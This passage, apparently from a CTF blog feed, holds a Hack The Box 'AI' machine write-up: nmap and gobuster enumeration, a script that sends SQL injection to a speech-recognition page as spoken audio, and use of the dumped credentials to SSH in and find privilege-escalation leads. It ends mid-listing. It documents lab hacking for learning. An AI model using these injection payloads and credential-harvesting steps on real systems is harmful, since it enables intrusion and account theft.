                                     Unknown SID <span style="color:#8be9fd;font-style:italic">type</span> S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PS C:<span style="color:#f1fa8c">\P</span>rogram Files<span style="color:#f1fa8c">\S</span>ysinternals&gt; .<span style="color:#f1fa8c">\a</span>ccesschk -accepteula -uvwc *
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
UsoSvc
  Medium Mandatory Level <span style="color:#ff79c6">(</span>Default<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>No-Write-Up<span style="color:#ff79c6">]</span>
  RW NT AUTHORITY<span style="color:#f1fa8c">\S</span>YSTEM
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY<span style="color:#f1fa8c">\S</span>ERVICE
        SERVICE_ALL_ACCESS
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>We can abuse this service at will.</p>
]]></content></item><item><title>HTB - Ai</title><link>https://0xade1.github.io/posts/2020/02/htb-ai/</link><pubDate>Mon, 10 Feb 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/02/htb-ai/</guid><description>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # Nmap 7.60 scan initiated Sun Feb 2 09:57:19 2020 as: nmap -sC -sV -oA nmap/AI 10.10.10.163 Nmap scan report for 10.10.10.163 Host is up (0.26s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA) | 256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA) |_ 256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (EdDSA) 80/tcp open http Apache httpd 2.</description><content type="html"><![CDATA[<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4"># Nmap 7.60 scan initiated Sun Feb  2 09:57:19 2020 as: nmap -sC -sV -oA nmap/AI 10.10.10.163</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.163
Host is up <span style="color:#ff79c6">(</span>0.26s latency<span style="color:#ff79c6">)</span>.
Not shown: <span style="color:#bd93f9">997</span> closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#ff79c6">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff79c6">)</span>
| ssh-hostkey:
|   <span style="color:#bd93f9">2048</span> 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc <span style="color:#ff79c6">(</span>RSA<span style="color:#ff79c6">)</span>
|   <span style="color:#bd93f9">256</span> 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 <span style="color:#ff79c6">(</span>ECDSA<span style="color:#ff79c6">)</span>
|_  <span style="color:#bd93f9">256</span> 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd <span style="color:#ff79c6">(</span>EdDSA<span style="color:#ff79c6">)</span>
80/tcp    open     http       Apache httpd 2.4.29 <span style="color:#ff79c6">((</span>Ubuntu<span style="color:#ff79c6">))</span>
|_http-server-header: Apache/2.4.29 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span>
|_http-title: Hello AI!
10004/tcp filtered emcrmirccd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></td></tr></table>
</div>
</div><p>edit /etc/hosts and add the row &lsquo;10.10.10.163 ai.htb&rsquo;</p>
<p>We use gobuster to look for additional php pages from a dictionary of most common pages</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/OJ/gobuster.git
<span style="color:#8be9fd;font-style:italic">cd</span> gobuster/
ls gobusterdir/
go get github.com/OJ/gobuster
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;export GOROOT=/usr/local/go&#39;</span> &gt;&gt; ~/.bashrc
./gobuster dir -w ../dictionaries/common.txt -x php -u http://ai.htb
<span style="color:#ff79c6">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@_FireFart_<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">===============================================================</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:            http://ai.htb
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:        <span style="color:#bd93f9">10</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:       ../dictionaries/common.txt
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:     gobuster/3.0.1
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Extensions:     php
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:        <span style="color:#8be9fd;font-style:italic">10s</span>
<span style="color:#ff79c6">===============================================================</span>
2020/02/09 13:10:56 Starting <span style="color:#8be9fd;font-style:italic">gobuster</span>
<span style="color:#ff79c6">===============================================================</span>
/.hta <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.hta.php <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.htaccess <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.htaccess.php <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.htpasswd <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/.htpasswd.php <span style="color:#ff79c6">(</span>Status: 403<span style="color:#ff79c6">)</span>
/about.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/contact.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/db.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/images <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/index.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/index.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/intelligence.php <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
Progress: <span style="color:#bd93f9">3420</span> / <span style="color:#bd93f9">4653</span> <span style="color:#ff79c6">(</span>73.50%<span style="color:#ff79c6">)</span>^C
<span style="color:#ff79c6">[</span>!<span style="color:#ff79c6">]</span> Keyboard interrupt detected, terminating.
<span style="color:#ff79c6">===============================================================</span>
2020/02/09 13:12:39 <span style="color:#8be9fd;font-style:italic">Finished</span>
<span style="color:#ff79c6">===============================================================</span>
</code></pre></td></tr></table>
</div>
</div><p>we find intelligence.php which gives us some hints on how to talk with the speech to text artificial intelligence.
We need a text-to-speech implementation which is the closest to Microsoft US-male implementation.
Trying with MacOsX <code>say</code>command is not successful and therefore we install festival on our docker machine.
Because our docker does not have a graphic interface (X installed is not installed), We build another script <a href="./ai.py">ai.py</a> to submit the WAV file generated with festival.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">import</span> re

URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://10.10.10.163/ai.php&#39;</span>
QUERY_FILE<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;./query.wav&#39;</span>

fin <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(QUERY_FILE, <span style="color:#f1fa8c">&#39;rb&#39;</span>)

files <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;fileToUpload&#39;</span>: (<span style="color:#f1fa8c">&#39;query.wav&#39;</span>, fin, <span style="color:#f1fa8c">&#39;audio/x-wav&#39;</span>) }
headers <span style="color:#ff79c6">=</span> {
        <span style="color:#6272a4">#&#34;Content-Type&#34;: m.content_type,</span>
        <span style="color:#f1fa8c">&#34;Connection&#34;</span>: <span style="color:#f1fa8c">&#34;keep-alive&#34;</span>,
        <span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&#39;</span>,
        <span style="color:#f1fa8c">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#f1fa8c">&#34;1&#34;</span>,
        <span style="color:#f1fa8c">&#34;DNT&#34;</span>: <span style="color:#f1fa8c">&#34;1&#34;</span>,
        <span style="color:#f1fa8c">&#34;Accept-Language&#34;</span>: <span style="color:#f1fa8c">&#34;en-US,en;q=0.5&#34;</span>,
        <span style="color:#f1fa8c">&#34;Accept-Encoding&#34;</span>: <span style="color:#f1fa8c">&#34;gzip, deflate&#34;</span>
    }
proxies <span style="color:#ff79c6">=</span> {
 <span style="color:#f1fa8c">&#39;http&#39;</span>: <span style="color:#f1fa8c">&#39;http://localhost:8080&#39;</span>
}
proxies<span style="color:#ff79c6">=</span><span style="color:#ff79c6">None</span>
myobj <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;submit&#39;</span>: <span style="color:#f1fa8c">&#39;Process It!&#39;</span>}
r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(URL, files<span style="color:#ff79c6">=</span>files, data<span style="color:#ff79c6">=</span>myobj, proxies<span style="color:#ff79c6">=</span>proxies )
<span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>status_code)
audio_query <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">&#39;&lt;h3&gt;Our understanding of your input is : ([^&lt;]*)&lt;br /&gt;&#39;</span>, r<span style="color:#ff79c6">.</span>content<span style="color:#ff79c6">.</span>decode())
sql_query <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">&#39;Query result : ([^&lt;]*)&lt;h3&gt;&#39;</span>, r<span style="color:#ff79c6">.</span>content<span style="color:#ff79c6">.</span>decode())
<span style="color:#ff79c6">try</span>:
    <span style="color:#8be9fd;font-style:italic">print</span> (<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Our understanding of your input is : </span><span style="color:#f1fa8c">{</span>audio_query[<span style="color:#bd93f9">1</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
    <span style="color:#8be9fd;font-style:italic">print</span> (<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Query result : </span><span style="color:#f1fa8c">{</span>sql_query[<span style="color:#bd93f9">1</span>]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
<span style="color:#ff79c6">except</span>:
    <span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>content)
</code></pre></td></tr></table>
</div>
</div><p>It is very useful to leverage Firefox Developer tools Network tab together with a custom python3 proxy
such as <a href="./http_proxy.py">http_proxy.py</a> or <a href="./tcp_proxy.py">tcp_proxy.py</a> to audit and analyze the http form POST.
We could also have used Blurp-suite but it was more fun to code a little bit, and what if we can&rsquo;t use burp during an engagement?</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install festival
virtualenv -p /usr/bin/pyhton3.8 .v3
. ./.v3/bin/activate
pip install requests

<span style="color:#8be9fd;font-style:italic">echo</span> open single quote, join, <span style="color:#ff79c6">select</span>, password from users comment database | text2wave -o query.wav
python3 ai.py
Our understanding of your input is : <span style="color:#f1fa8c">\&#39;</span>union <span style="color:#ff79c6">select</span> password from users -- -&lt;br /&gt;Query result : H,Sq9t6<span style="color:#ff79c6">}</span>a&lt;<span style="color:#ff79c6">)</span>?q93_

<span style="color:#8be9fd;font-style:italic">echo</span> open single quote, join, <span style="color:#ff79c6">select</span>, username from users comment database | text2wave -o query.wav
python3 ai.py
Our understanding of your input is : &#39;union <span style="color:#ff79c6">select</span> username from users -- -
Query result : alexa
</code></pre></td></tr></table>
</div>
</div><p>We have now identify <code>alexa:H,Sq9t6}a&lt;)?q93_</code> and we use it to ssh into the user account</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh alexa@ai.htb
alexa@AI:~$ cat user.txt
c43*************************5e4b
alexa@AI:~$ <span style="color:#8be9fd;font-style:italic">cd</span> /var/www/html/
alexa@AI:/var/www/html$ cat db.php
&lt;?php
<span style="color:#8be9fd;font-style:italic">$conn</span> <span style="color:#ff79c6">=</span> new mysqli<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#39;localhost&#39;</span>,<span style="color:#f1fa8c">&#39;dbuser&#39;</span>,<span style="color:#f1fa8c">&#39;toor&#39;</span>,<span style="color:#f1fa8c">&#39;alexa&#39;</span><span style="color:#ff79c6">)</span>;

alexa@AI:~$ mysql -udbuser -p
show databases;
use alexa;
show tables;
<span style="color:#ff79c6">select</span> * from users;
+----------+------------------+
| username | password         |
+----------+------------------+
| alexa    | H,Sq9t6<span style="color:#ff79c6">}</span>a&lt;<span style="color:#ff79c6">)</span>?q93_ |
| root     | H,Sq9t6<span style="color:#ff79c6">}</span>a&lt;<span style="color:#ff79c6">)</span>?q931 |
| dbuser   | toor             |
| awsadm   | awsadm           |
+----------+------------------+
</code></pre></td></tr></table>
</div>
</div><p>Our machine IP address is 10.10.14.73, We download linpeas.sh and we start a python web server to upload the script remotely</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
<span style="color:#8be9fd;font-style:italic">cd</span> privilege-escalation-awesome-scripts-suite/linPEAS/
python3 -m http.server <span style="color:#bd93f9">80</span>
</code></pre></td></tr></table>
</div>
</div><p>On the remote machine, we run linpeas.sh that informs us of a process running Java in debug mode with jdwp on port 8000 (it is &gt;99% a privilege escalation vector)
<a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/">JDWP exploitation</a>
We are also informed tomcat is running on port 8080, so if we can access the tomcat manager we may be able to upload an executable war file</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
